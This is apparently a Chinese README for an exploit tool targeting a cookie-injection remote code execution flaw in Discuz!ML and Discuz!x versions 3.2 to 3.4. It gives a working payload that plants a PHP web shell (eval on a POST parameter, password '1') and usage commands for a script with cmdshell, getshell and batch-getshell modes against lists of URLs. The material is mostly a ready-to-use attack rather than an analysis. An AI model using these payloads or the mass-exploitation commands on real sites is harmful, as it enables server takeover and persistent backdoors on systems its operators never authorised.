# discuz-ml-rce
影响系统及版本：Discuz!ML V3.2-3.4 Discuz!x V3.2-3.4
漏洞原因：Discuz!ML 系统对cookie中的l接收的language参数内容未过滤，导致字符串拼接，从而执行php代码。




cookie字段中会出现xxxx_xxxx_language字段，根本原因就是这个字段存在注入，导致的RCE

抓包找到cookie的language的值修改为

xxxx_xxxx_language=sc'.phpinfo().'


getshell

%27.%2Bfile_put_contents%28%27shell.php%27%2Curldecode%28%27%253C%253Fphp%2520eval%2528%2524_POST%255B%25221%2522%255D%2529%253B%253F%253E%27%29%29.%27
实际为：

'.+file_put_contents('shell.php',urldecode('<?php eval($_POST["1"]);?>')).'



即可在路径下生成shell.php，连接密码为1



==============================================================================================================================================================
判断是否存在漏洞

python dz-ml-rce.py -u "http://www.xxx.cn/forum.php"


cmdshell模式

python dz-ml-rce.py -u "http://www.xxx.cn/forum.php" --cmdshell


getshell模式

python dz-ml-rce.py -u "http://www.xxx.cn/forum.php" --getshell


批量检测

python dz-ml-rce.py -f urls.txt


批量getshell

python dz-ml-rce.py -f urls.txt --getshell




